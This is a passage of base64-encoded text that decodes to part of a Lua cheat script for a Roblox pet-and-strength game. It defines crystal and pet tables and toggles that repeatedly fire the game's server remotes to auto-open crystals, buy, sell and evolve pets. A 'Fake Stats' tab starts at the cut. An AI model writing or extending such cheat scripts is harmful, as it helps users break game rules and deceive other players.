ljIEJ1dHRlcmZseSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJTdXBlcm5vdmEiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlB1cnBsZSBOb3ZhIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9LAogICAgWyJNdXNjbGUgRWxpdGUgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIkZyb3N0d2F2ZSBMZWdlbmRzIFBlbmd1aW4iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIlBoYW50b20gR2VuZXNpcyBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgTGVnZW5kcyBNYW50aWNvcmUiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlVsdGltYXRlIFN1cGVybm92YSBQZWdhc3VzIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJBZXRoZXIgU3Bpcml0IEJ1bm55IiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkN5YmVybmV0aWMgU2hvd2Rvd24gRHJhZ29uIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9LAogICAgWyJHYWxheHkgT3JhY2xlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRGFya3N0YXIgSHVudGVyIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIk11c2NsZSBLaW5nIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkF6dXJlIFR1bmRyYSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiVWx0cmEgSW5mZXJubyIsIHJhcml0eSA9ICJSYXJlIn0KICAgIH0sCiAgICBbIkp1bmdsZSBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiRW50cm9waWMgQmxhc3QiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiTXVzY2xlIFNlbnNlaSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJHcmFuZCBTdXBlcm5vdmEiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIk5lb24gR3VhcmRpYW4iLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiRXRlcm5hbCBNZWdhc3RyaWtlIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkdvbGRlbiBWaWtpbmciLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkFzdHJhbCBFbGVjdHJvIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIEVsZWN0cm8iLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkVuY2hhbnRlZCBNaXJhZ2UiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlVsdHJhIE1pcmFnZSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJVbnN0YWJsZSBNaXJhZ2UiLCByYXJpdHkgPSAiVW5pcXVlIn0KICAgIH0KfQoKLS0gRnVuY3Rpb24gdG8gZmluZCB3aGljaCBjcnlzdGFsIGNvbnRhaW5zIGEgc3BlY2lmaWMgcGV0L2F1cmEKbG9jYWwgZnVuY3Rpb24gZmluZENyeXN0YWxGb3JJdGVtKGl0ZW1OYW1lKQogICAgZm9yIGNyeXN0YWxOYW1lLCBwZXRzIGluIHBhaXJzKGNyeXN0YWxEYXRhKSBkbwogICAgICAgIGZvciBfLCBwZXQgaW4gaXBhaXJzKHBldHMpIGRvCiAgICAgICAgICAgIGlmIHBldC5uYW1lID09IGl0ZW1OYW1lIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBjcnlzdGFsTmFtZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG5pbAplbmQKCi0tIEF1dG8gT3BlbiBDcnlzdGFscyBTZWN0aW9uClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBPcGVuIENyeXN0YWxzIn0pCgpsb2NhbCBzZWxlY3RlZENyeXN0YWwgPSAiQmx1ZSBDcnlzdGFsIgpsb2NhbCBhdXRvT3BlbkNyeXN0YWwgPSBmYWxzZQoKbG9jYWwgY3J5c3RhbERyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgQ3J5c3RhbCIsCiAgICBMaXN0ID0gewogICAgICAgICJCbHVlIENyeXN0YWwiLCAiR3JlZW4gQ3J5c3RhbCIsICJGcm9zdCBDcnlzdGFsIiwgIk15dGhpY2FsIENyeXN0YWwiLCAKICAgICAgICAiSW5mZXJubyBDcnlzdGFsIiwgIkxlZ2VuZHMgQ3J5c3RhbCIsICJNdXNjbGUgRWxpdGUgQ3J5c3RhbCIsIAogICAgICAgICJHYWxheHkgT3JhY2xlIENyeXN0YWwiLCAiSnVuZ2xlIENyeXN0YWwiCiAgICB9LAogICAgVmFsdWUgPSAiQmx1ZSBDcnlzdGFsIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzZWxlY3RlZENyeXN0YWwgPSB0ZXh0CiAgICBlbmQKfSkKClBldFNob3BUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gT3BlbiBDcnlzdGFsIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBvcGVuIHNlbGVjdGVkIGNyeXN0YWwiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b09wZW5DcnlzdGFsID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b09wZW5DcnlzdGFsIGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5vcGVuQ3J5c3RhbFJlbW90ZTpJbnZva2VTZXJ2ZXIoIm9wZW5DcnlzdGFsIiwgc2VsZWN0ZWRDcnlzdGFsKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBCdXkgUGV0cyAmIEF1cmFzIFNlY3Rpb24KUGV0U2hvcFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIEJ1eSBQZXRzICYgQXVyYXMifSkKCmxvY2FsIHNlbGVjdGVkUGV0ID0gIiIKbG9jYWwgc2VsZWN0ZWRBdXJhID0gIiIKbG9jYWwgYXV0b0J1eVBldCA9IGZhbHNlCmxvY2FsIGF1dG9CdXlBdXJhID0gZmFsc2UKCi0tIFBldCBkcm9wZG93bgpsb2NhbCBwZXRMaXN0ID0gewogICAgIkJsdWUgQmlyZGllIChCYXNpYykiLCAiT3JhbmdlIEhlZGdlaG9nIChCYXNpYykiLCAiUmVkIEtpdHR5IChCYXNpYykiLCAiQmx1ZSBCdW5ueSAoQmFzaWMpIiwgIlNpbHZlciBEb2cgKEJhc2ljKSIsCiAgICAiRGFyayBWYW1weSAoQWR2YW5jZWQpIiwgIkRhcmsgR29sZW0gKEFkdmFuY2VkKSIsICJHcmVlbiBCdXR0ZXJmbHkgKEFkdmFuY2VkKSIsICJZZWxsb3cgQnV0dGVyZmx5IChBZHZhbmNlZCkiLAogICAgIkNyaW1zb24gRmFsY29uIChSYXJlKSIsICJQdXJwbGUgRHJhZ29uIChSYXJlKSIsICJPcmFuZ2UgUGVnYXN1cyAoUmFyZSkiLCAiUHVycGxlIEZhbGNvbiAoUmFyZSkiLCAiUmVkIERyYWdvbiAoUmFyZSkiLAogICAgIldoaXRlIFBlZ2FzdXMgKFJhcmUpIiwgIkZyb3N0d2F2ZSBMZWdlbmRzIFBlbmd1aW4gKFJhcmUpIiwgIlBoYW50b20gR2VuZXNpcyBEcmFnb24gKFJhcmUpIiwgIkV0ZXJuYWwgU3RyaWtlIExldmlhdGhhbiAoUmFyZSkiLAogICAgIkJsdWUgUGhlb25peCAoRXBpYykiLCAiQmx1ZSBGaXJlY2FzdGVyIChFcGljKSIsICJHb2xkZW4gUGhlb25peCAoRXBpYykiLCAiUmVkIEZpcmVjYXN0ZXIgKEVwaWMpIiwgIkdyZWVuIEZpcmVjYXN0ZXIgKEVwaWMpIiwKICAgICJXaGl0ZSBQaGVvbml4IChFcGljKSIsICJEYXJrIExlZ2VuZHMgTWFudGljb3JlIChFcGljKSIsICJVbHRpbWF0ZSBTdXBlcm5vdmEgUGVnYXN1cyAoRXBpYykiLCAiTGlnaHRuaW5nIFN0cmlrZSBQaGFudG9tIChFcGljKSIsCiAgICAiR29sZGVuIFZpa2luZyAoRXBpYykiLCAiSW5mZXJuYWwgRHJhZ29uIChVbmlxdWUpIiwgIlVsdHJhIEJpcmRpZSAoVW5pcXVlKSIsICJNYWdpYyBCdXR0ZXJmbHkgKFVuaXF1ZSkiLCAiQWV0aGVyIFNwaXJpdCBCdW5ueSAoVW5pcXVlKSIsCiAgICAiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24gKFVuaXF1ZSkiLCAiRGFya3N0YXIgSHVudGVyIChVbmlxdWUpIiwgIk11c2NsZSBTZW5zZWkgKFVuaXF1ZSkiLCAiTmVvbiBHdWFyZGlhbiAoVW5pcXVlKSIKfQoKbG9jYWwgcGV0RHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBQZXQiLAogICAgTGlzdCA9IHBldExpc3QsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNlbGVjdGVkUGV0ID0gdGV4dAogICAgZW5kCn0pCgotLSBBdXJhIGRyb3Bkb3duCmxvY2FsIGF1cmFMaXN0ID0gewogICAgIkJsdWUgQXVyYSAoQmFzaWMpIiwgIkdyZWVuIEF1cmEgKEJhc2ljKSIsICJQdXJwbGUgQXVyYSAoQmFzaWMpIiwgIlJlZCBBdXJhIChCYXNpYykiLCAiWWVsbG93IEF1cmEgKEJhc2ljKSIsCiAgICAiVWx0cmEgSW5mZXJubyAoUmFyZSkiLCAiQXp1cmUgVHVuZHJhIChFcGljKSIsICJHcmFuZCBTdXBlcm5vdmEgKEVwaWMpIiwgIk11c2NsZSBLaW5nIChVbmlxdWUpIiwgCiAgICAiRW50cm9waWMgQmxhc3QgKFVuaXF1ZSkiLCAiRXRlcm5hbCBNZWdhc3RyaWtlIChVbmlxdWUpIgp9Cgpsb2NhbCBhdXJhRHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBBdXJhIiwKICAgIExpc3QgPSBhdXJhTGlzdCwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2VsZWN0ZWRBdXJhID0gdGV4dAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEJ1eSBQZXQiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGJ1eSBzZWxlY3RlZCBwZXQiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0J1eVBldCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkUGV0IH49ICIiIHRoZW4KICAgICAgICAgICAgbG9jYWwgcGV0TmFtZSA9IHNlbGVjdGVkUGV0Om1hdGNoKCJeKC4tKSVzKiUoIikgb3Igc2VsZWN0ZWRQZXQKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvQnV5UGV0IGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwZXRUb0J1eSA9IFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wRm9sZGVyOkZpbmRGaXJzdENoaWxkKHBldE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBldFRvQnV5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wUmVtb3RlOkludm9rZVNlcnZlcihwZXRUb0J1eSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEJ1eSBBdXJhIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBidXkgc2VsZWN0ZWQgYXVyYSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvQnV5QXVyYSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkQXVyYSB+PSAiIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIGF1cmFOYW1lID0gc2VsZWN0ZWRBdXJhOm1hdGNoKCJeKC4tKSVzKiUoIikgb3Igc2VsZWN0ZWRBdXJhCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0J1eUF1cmEgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGF1cmFUb0J1eSA9IFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wRm9sZGVyOkZpbmRGaXJzdENoaWxkKGF1cmFOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhdXJhVG9CdXkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BSZW1vdGU6SW52b2tlU2VydmVyKGF1cmFUb0J1eSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIFNlbGwgUGV0cyBTZWN0aW9uClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBTZWxsIFBldHMifSkKCmxvY2FsIHNlbGVjdGVkU2VsbFBldCA9ICIiCmxvY2FsIGF1dG9TZWxsUGV0ID0gZmFsc2UKCmxvY2FsIHNlbGxQZXREcm9wZG93biA9IFBldFNob3BUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFBldCB0byBTZWxsIiwKICAgIExpc3QgPSB7CiAgICAgICAgIkJsdWUgQmlyZGllIiwgIk9yYW5nZSBIZWRnZWhvZyIsICJSZWQgS2l0dHkiLCAiQmx1ZSBCdW5ueSIsICJTaWx2ZXIgRG9nIiwKICAgICAgICAiRGFyayBWYW1weSIsICJEYXJrIEdvbGVtIiwgIkdyZWVuIEJ1dHRlcmZseSIsICJZZWxsb3cgQnV0dGVyZmx5IiwKICAgICAgICAiQ3JpbXNvbiBGYWxjb24iLCAiUHVycGxlIERyYWdvbiIsICJPcmFuZ2UgUGVnYXN1cyIsICJQdXJwbGUgRmFsY29uIiwgIlJlZCBEcmFnb24iLAogICAgICAgICJXaGl0ZSBQZWdhc3VzIiwgIkZyb3N0d2F2ZSBMZWdlbmRzIFBlbmd1aW4iLCAiUGhhbnRvbSBHZW5lc2lzIERyYWdvbiIsICJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4iLAogICAgICAgICJCbHVlIFBoZW9uaXgiLCAiQmx1ZSBGaXJlY2FzdGVyIiwgIkdvbGRlbiBQaGVvbml4IiwgIlJlZCBGaXJlY2FzdGVyIiwgIkdyZWVuIEZpcmVjYXN0ZXIiLAogICAgICAgICJXaGl0ZSBQaGVvbml4IiwgIkRhcmsgTGVnZW5kcyBNYW50aWNvcmUiLCAiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMiLCAiTGlnaHRuaW5nIFN0cmlrZSBQaGFudG9tIiwKICAgICAgICAiR29sZGVuIFZpa2luZyIsICJJbmZlcm5hbCBEcmFnb24iLCAiVWx0cmEgQmlyZGllIiwgIk1hZ2ljIEJ1dHRlcmZseSIsICJBZXRoZXIgU3Bpcml0IEJ1bm55IiwKICAgICAgICAiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24iLCAiRGFya3N0YXIgSHVudGVyIiwgIk11c2NsZSBTZW5zZWkiLCAiTmVvbiBHdWFyZGlhbiIKICAgIH0sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNlbGVjdGVkU2VsbFBldCA9IHRleHQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBTZWxsIFBldCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgc2VsbCBzZWxlY3RlZCBwZXQiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b1NlbGxQZXQgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZFNlbGxQZXQgfj0gIiIgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGF1dG9TZWxsUGV0IGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmb3VuZFBldCA9IG5pbAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBmb2xkZXI6SXNBKCJGb2xkZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGV0ID0gZm9sZGVyOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkU2VsbFBldCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZFBldCA9IHBldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBmb3VuZFBldCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5zZWxsUGV0RXZlbnQ6RmlyZVNlcnZlcigic2VsbFBldCIsIGZvdW5kUGV0KQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhdXRvU2VsbFBldCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBFdm9sdmUgUGV0cyBTZWN0aW9uClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBFdm9sdmUgUGV0cyJ9KQoKbG9jYWwgc2VsZWN0ZWRSYXJpdHkgPSAiIgpsb2NhbCBhdXRvRXZvbHZlID0gZmFsc2UKCmxvY2FsIGV2b2x2ZURyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgUmFyaXR5IHRvIEV2b2x2ZSIsCiAgICBMaXN0ID0geyJCYXNpYyIsICJBZHZhbmNlZCIsICJSYXJlIiwgIkVwaWMiLCAiVW5pcXVlIn0sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNlbGVjdGVkUmFyaXR5ID0gdGV4dAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEV2b2x2ZSBQZXRzIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBldm9sdmUgcGV0cyBvZiBzZWxlY3RlZCByYXJpdHkiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0V2b2x2ZSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkUmFyaXR5IH49ICIiIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvRXZvbHZlIGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBmb2xkZXI6SXNBKCJGb2xkZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGNyeXN0YWxOYW1lLCBwZXRzIGluIHBhaXJzKGNyeXN0YWxEYXRhKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBldERhdGEgaW4gaXBhaXJzKHBldHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0RGF0YS5uYW1lID09IHBldC5OYW1lIGFuZCBwZXREYXRhLnJhcml0eSA9PSBzZWxlY3RlZFJhcml0eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnBldEV2b2x2ZUV2ZW50OkZpcmVTZXJ2ZXIoImV2b2x2ZVBldCIsIHBldC5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClBldFNob3BUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkV2b2x2ZSBTZWxlY3RlZCBSYXJpdHkgT25jZSIsCiAgICBEZXNjID0gIkV2b2x2ZSBhbGwgcGV0cyBvZiBzZWxlY3RlZCByYXJpdHkgb25jZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBzZWxlY3RlZFJhcml0eSA9PSAiIiB0aGVuIHJldHVybiBlbmQKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGV2b2x2ZWRDb3VudCA9IDAKICAgICAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwbGF5ZXIucGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBwZXQgaW4gcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwZXREYXRhIGluIGlwYWlycyhwZXRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBldERhdGEubmFtZSA9PSBwZXQuTmFtZSBhbmQgcGV0RGF0YS5yYXJpdHkgPT0gc2VsZWN0ZWRSYXJpdHkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5wZXRFdm9sdmVFdmVudDpGaXJlU2VydmVyKCJldm9sdmVQZXQiLCBwZXQuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZvbHZlZENvdW50ID0gZXZvbHZlZENvdW50ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJFdm9sdmUgQ29tcGxldGUiLAogICAgICAgICAgICAgICAgRGVzYyA9ICJFdm9sdmVkICIgLi4gZXZvbHZlZENvdW50IC4uICIgIiAuLiBzZWxlY3RlZFJhcml0eSAuLiAiIHBldHMiLAogICAgICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICAgICAgfSkKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIEZha2UgU3RhdHMgVGFiCmxvY2FsIEZha2VTdGF0c1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIkZha2UgU3RhdHMiLCBJY29uID0gInRyZW5kaW5nLXVwIn0pCgotLSBGYWtlIHN0YXRzIHN0b3JhZ2UKbG9jYWwgZmFrZVN0YXRzID0gewogICAgU3RyZW5ndGggPSAwLAogICAgRHVyYWJpbGl0eSA9IDAsCiAgICBSZWJpcnRocyA9IDAsCiAgICBHZW1zID0gMCwKICAgIEtpbGxzID0gMCwKICAgIEJyYXdscyA9IDAsCiAgICBBZ2lsaXR5ID0gMCwKICAgIEdvb2RLYXJtYSA9IDAsCiAgICBFdmlsS2FybWEgPSAwCn0KCi0tIFRvZ2dsZSBzdGF0ZXMgZm9yIGVhY2ggc3RhdApsb2NhbCB0b2dnbGVTdGF0ZX